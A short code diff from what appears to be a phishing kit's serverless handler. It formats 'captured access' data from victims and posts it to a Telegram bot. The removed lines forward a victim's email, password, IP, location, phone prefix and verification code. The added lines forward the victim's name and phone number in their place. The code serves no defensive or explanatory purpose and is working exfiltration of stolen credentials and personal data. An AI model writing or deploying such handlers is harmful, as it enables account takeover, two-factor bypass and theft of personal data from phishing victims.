@@ -17,9 +17,9 @@ export default async function handler(req, res) {
 
   let texto;
   if (fase === '1') {
-    texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 password: ${password}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;
+    texto = `📩 Nuevo acceso capturado\n\n📧 correo: ${correo}\n👤 nombre: ${nombre}\n🌐 IP: ${ip}\n📍 Ubicación: ${ubicacion}`;
   } else {
-    texto = `📞 lada: ${lada}\n🔢 CODIGO: ${CODIGO}`;
+    texto = `📞 lada: ${lada}\n🔢 numero: ${numero}`;
   }
 
   await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
